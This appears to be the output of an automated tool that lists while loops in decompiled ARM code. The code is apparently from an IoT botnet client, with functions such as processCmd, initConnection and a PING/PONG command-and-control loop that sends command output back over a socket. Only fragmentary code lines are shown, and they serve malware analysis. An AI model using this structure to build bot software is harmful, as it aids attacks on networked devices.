++++++++ WHILE START : 16000 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16006 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 16199 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16205 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 16254 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16260 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 16279 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16285 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 16316 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16322 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 16363 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16369 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 16436 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16442 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 112 @ processCmd ====================================
++++++++ WHILE START : 16461 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16467 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 113 @ processCmd ====================================
++++++++ WHILE START : 16498 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16504 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 114 @ processCmd ====================================
++++++++ WHILE START : 16545 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16551 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 115 @ processCmd ====================================
++++++++ WHILE START : 16571 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16577 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 116 @ processCmd ====================================
++++++++ WHILE START : 16665 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16671 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 117 @ processCmd ====================================
++++++++ WHILE START : 16720 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16726 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 118 @ processCmd ====================================
++++++++ WHILE START : 16745 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16751 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 119 @ processCmd ====================================
++++++++ WHILE START : 16782 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16788 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 120 @ processCmd ====================================
++++++++ WHILE START : 16829 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16835 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 121 @ processCmd ====================================
++++++++ WHILE START : 16882 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16888 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 122 @ processCmd ====================================
++++++++ WHILE START : 17105 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17111 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 123 @ processCmd ====================================
++++++++ WHILE START : 17140 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17146 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 124 @ processCmd ====================================
++++++++ WHILE START : 17187 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17193 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 125 @ processCmd ====================================
++++++++ WHILE START : 17207 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17213 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 126 @ processCmd ====================================
++++++++ WHILE START : 17301 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17307 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 127 @ processCmd ====================================
++++++++ WHILE START : 17336 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17342 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 128 @ processCmd ====================================
++++++++ WHILE START : 17383 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17389 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 129 @ processCmd ====================================
++++++++ WHILE START : 17576 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17582 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 130 @ processCmd ====================================
++++++++ WHILE START : 17611 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17617 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 131 @ processCmd ====================================
++++++++ WHILE START : 17658 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17664 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 132 @ processCmd ====================================
++++++++ WHILE START : 17678 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17684 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 133 @ processCmd ====================================
++++++++ WHILE START : 17772 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17778 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 134 @ processCmd ====================================
++++++++ WHILE START : 17807 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17813 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 135 @ processCmd ====================================
++++++++ WHILE START : 17854 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17860 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 136 @ getOurIP ====================================
++++++++ WHILE START : 18152 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 18255 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v106, 0x1000, v104, v106) != 0) {
		if (strstr(v106, "\t00000000\t") != 0) {
		__GI_close(v104);
		__GI_close(v97);
		__GI_close(v97);
		__GI_close(v104);
		__GI_close(v97);
		__GI_close(v97);
		__GI_close(v104);
		__GI_close(v97);
		__GI_close(v97);
=============================WHILE LOOPS ID : 137 @ main ====================================
++++++++ WHILE START : 18494 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18948 
++++++++ INTRESTING INSTRUCTIONS :  
		sprintf(v111, (int32_t)"\"%s%s\"\n", v107, v109 + len2, (int32_t)&v105, (int32_t)&v105, (int32_t)&v105);
		while (true) {
		while (true) {
		fgets((int32_t)&v98, 1024, v93);
		if (__GI_strcasecmp((char *)&v98, v111) == 0) {
		__GI_fclose(v112);
		int32_t v114 = __GI_fopen((int32_t)v94, (int32_t)&v113); // 0x10fbc
		__GI_fclose((int16_t *)v114);
		getOurIP();
		v101 = __libc_fork();
		if (__libc_fork() == 0) {
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		getBuild();
		__GI_inet_ntoa(v115);
		sockprintf(v96, (int32_t)"Connected %s:%s");
		while (true) {
		while (true) {
		if (recvLine(v96, (char *)&v99, 0x1000, v104) == -1) {
		while (true) {
		if (__libc_waitpid(v123, 0, 1) >= 1) {
		while (true) {
		while (true) {
		free();
		if (strstr(v104, "PING") == v104) {
		sockprintf(v96, (int32_t)"PONG");
		if (strstr(v104, "DUP") == v104) {
		zprintf((int32_t)"PEACE OUT IMMA DUP\n");
		while (true) {
		if (initConnection() == 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (listFork() == 0) {
		while (true) {
		processCmd(v149, &v110);
		processCmd(v149, &v110);
		while (true) {
		free();
		while (true) {
		if (__libc_waitpid(v123, 0, 1) < 1) {
		getBuild();
		__GI_inet_ntoa(v115);
		sockprintf(v96, (int32_t)"Connected %s:%s");
		__libc_waitpid(v101, (int32_t)&v97, 0);
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 138 @ main ====================================
++++++++ WHILE START : 18972 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18978 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 139 @ main ====================================
++++++++ WHILE START : 18994 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19000 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 140 @ main ====================================
++++++++ WHILE START : 19024 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19030 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 141 @ main ====================================
++++++++ WHILE START : 19046 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19052 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 142 @ main ====================================
++++++++ WHILE START : 19059 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19076 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v103, 1024, v157, v103) == 0) {
		fdpclose(v157);
		sockprintf(v96, (int32_t)"%s");
=============================WHILE LOOPS ID : 143 @ __udivsi3 ====================================
++++++++ WHILE START : 19320 
++++++++ WHILE FUNCTION : __udivsi3 
++++++++ WHILE END : 19532 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 145 @ _stdio_term ====================================
++++++++ WHILE START : 25060 
++++++++ WHILE FUNCTION : _stdio_term 
++++++++ WHILE END : 25110 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 148 @ _vfprintf_internal ====================================
++++++++ WHILE START : 26044 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 26810 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 150 @ _ppfs_setargs ====================================
++++++++ WHILE START : 27210 
++++++++ WHILE FUNCTION : _ppfs_setargs 
++++++++ WHILE END : 27319 
++++++++ INTRESTING INSTRUCTIONS :  
		case 256: {
		case 512: {
=============================WHILE LOOPS ID : 152 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 27602 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 28503 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 157 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 29986 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 30058 
++++++++ INTRESTING INSTRUCTIONS :  
		uint32_t v105 = getc_unlocked((int16_t *)a3); // 0x14048
=============================WHILE LOOPS ID : 162 @ strstr ====================================
++++++++ WHILE START : 31275 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 31394 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 166 @ strncpy ====================================
++++++++ WHILE START : 32015 
++++++++ WHILE FUNCTION : strncpy 
++++++++ WHILE END : 32049 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 167 @ strncpy ====================================
++++++++ WHILE START : 32056 
++++++++ WHILE FUNCTION : strncpy 
++++++++ WHILE END : 32110 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 173 @ strcasestr ====================================
++++++++ WHILE START : 33027 
++++++++ WHILE FUNCTION : strcasestr 
++++++++ WHILE END : 33073 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 175 @ malloc ====================================
++++++++ WHILE START : 37574 
++++++++ WHILE FUNCTION : malloc 
++++++++ WHILE END : 39010 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		while (true) {
=============================WHILE LOOPS ID : 176 @ __malloc_consolidate ====================================
++++++++ WHILE START : 39886 
++++++++ WHILE FUNCTION : __malloc_consolidate 
++++++++ WHILE END : 39988 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 178 @ srandom_r ====================================
++++++++ WHILE START : 42163 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 42199 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__GI_random_r((int32_t *)v97, (int32_t)&v109);
=============================WHILE LOOPS ID : 180 @ _stdlib_strto_l ====================================
++++++++ WHILE START : 42830 
++++++++ WHILE FUNCTION : _stdlib_strto_l 
++++++++ WHILE END : 43178 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 182 @ nprocessors_onln ====================================
++++++++ WHILE START : 43584 
++++++++ WHILE FUNCTION : nprocessors_onln 
++++++++ WHILE END : 43615 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_config_close((int32_t *)v102);
=============================WHILE LOOPS ID : 210 @ readdir64 ====================================
++++++++ WHILE START : 49313 
++++++++ WHILE FUNCTION : readdir64 
++++++++ WHILE END : 49349 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__getdents64(v109, (int32_t *)v110, v111, v102) < 1) {
=============================WHILE LOOPS ID : 211 @ __GI_config_read ====================================
++++++++ WHILE START : 49677 
++++++++ WHILE FUNCTION : __GI_config_read 
++++++++ WHILE END : 50026 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t v120 = fgets(v117 + v110, v119 - v110, v118); // 0x181b0
		while (true) {
		v127 = getc_unlocked((int16_t *)v128);
		while (true) {
		while (true) {
		v127 = __GI_fgetc(v128);
=============================WHILE LOOPS ID : 215 @ __stdio_WRITE ====================================
++++++++ WHILE START : 50888 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 50963 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 218 @ _fpmaxtostr ====================================
++++++++ WHILE START : 52175 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 55540 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 232 @ _memcpy ====================================
++++++++ WHILE START : 57714 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 57826 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 239 @ __GI_memchr ====================================
++++++++ WHILE START : 58242 
++++++++ WHILE FUNCTION : __GI_memchr 
++++++++ WHILE END : 58369 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 245 @ memrchr ====================================
++++++++ WHILE START : 58978 
++++++++ WHILE FUNCTION : memrchr 
++++++++ WHILE END : 59088 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 248 @ __GI_strspn ====================================
++++++++ WHILE START : 59227 
++++++++ WHILE FUNCTION : __GI_strspn 
++++++++ WHILE END : 59257 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 252 @ __GI_strpbrk ====================================
++++++++ WHILE START : 59792 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 59818 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 253 @ inet_aton ====================================
++++++++ WHILE START : 59926 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 60016 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 254 @ gethostbyname2_r ====================================
++++++++ WHILE START : 60190 
++++++++ WHILE FUNCTION : gethostbyname2_r 
++++++++ WHILE END : 60203 
++++++++ INTRESTING INSTRUCTIONS :  
		v111 = __dns_lookup((char *)v103, 28, v110, (int32_t)&v105);
=============================WHILE LOOPS ID : 255 @ gethostbyname2_r ====================================
++++++++ WHILE START : 60248 
++++++++ WHILE FUNCTION : gethostbyname2_r 
++++++++ WHILE END : 60261 
++++++++ INTRESTING INSTRUCTIONS :  
		v111 = __dns_lookup((char *)v103, 28, v110, (int32_t)&v105);
=============================WHILE LOOPS ID : 256 @ gethostbyname2_r ====================================
++++++++ WHILE START : 60309 
++++++++ WHILE FUNCTION : gethostbyname2_r 
++++++++ WHILE END : 60362 
++++++++ INTRESTING INSTRUCTIONS :  
		v111 = __dns_lookup((char *)v103, 28, v110, (int32_t)&v105);
		free();
		free();
		free();
		free();
=============================WHILE LOOPS ID : 260 @ inet_pton ====================================
++++++++ WHILE START : 63627 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 63840 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_pton4(v104, v102) > 0) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 262 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 64124 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 64448 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		if (inet_ntop4(a2 + 12, v136, v101 - v136 - 32) == 0) {
		v134 = sprintf(v136, v115, v132, v133, (int32_t)&v135, (int32_t)&v135, (int32_t)&v135);
		if (inet_ntop4(a2 + 12, v136, v101 - v136 - 32) == 0) {
		v134 = sprintf(v130, v115, v132, v133, (int32_t)&v135, (int32_t)&v135, (int32_t)&v135);
		while (true) {
=============================WHILE LOOPS ID : 264 @ __dns_lookup ====================================
++++++++ WHILE START : 64808 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 65396 
++++++++ INTRESTING INSTRUCTIONS :  
		__open_nameservers();
		v98 = socket((int32_t)v102, 2, 17);
		if (__libc_connect(v98, v103, 28) >= 0) {
		__libc_send(v98, v96, v130 + v132, v114);
		while (true) {
		int32_t result = __libc_recv(v98, v96, 512, 64, (int32_t)&v137); // 0x1b5ec
		__GI_close(v98);
		free();
		free();
		while (true) {
		while (true) {
		free();
		__GI_close(v98);
		free();
		free();
		__GI_close(v98);
		free();
		free();
		free();
		__GI_close(v98);
		free();
		free();
		__GI_close(v98);
		free();
		free();
		__GI_close(v98);
		free();
		free();
		__GI_close(v98);
		free();
		free();
		__GI_close(v98);
		free();
		free();
		__GI_close(v98);
		free();
		free();
		free();
		free();
		free();
		__GI_close(v98);
		free();
		free();
		__GI_close(v98);
		free();
		free();
=============================WHILE LOOPS ID : 266 @ __open_nameservers ====================================
++++++++ WHILE START : 65923 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 66050 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_pton(10, (char *)v120, (int32_t)&v124) < 1) {
		if (inet_pton(2, (char *)v120, (int32_t)&v127) >= 1) {
		if (fgets(v118, 128, v107) == 0) {
		if (fgets(v118, 128, v107) == 0) {
		while (true) {
		free();
		while (true) {
		if (fgets(v118, 128, v107) == 0) {
=============================WHILE LOOPS ID : 267 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68108 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68186 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_config_close((int32_t *)v99);
		if (inet_pton(v113, (char *)v114, v106) >= 1) {
		__GI_config_close((int32_t *)v99);
		if (inet_pton(10, (char *)v115, v106) >= 1) {
		__GI_config_close((int32_t *)v99);
=============================WHILE LOOPS ID : 268 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68187 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68199 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcasecmp(v109, v111) == 0) {
=============================WHILE LOOPS ID : 269 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68200 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68215 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_config_close((int32_t *)v99);
=============================WHILE LOOPS ID : 271 @ __aeabi_idiv ====================================
++++++++ WHILE START : 68832 
++++++++ WHILE FUNCTION : __aeabi_idiv 
++++++++ WHILE END : 69060 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 272 @ __aeabi_ddiv ====================================
++++++++ WHILE START : 72697 
++++++++ WHILE FUNCTION : __aeabi_ddiv 
++++++++ WHILE END : 72914 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
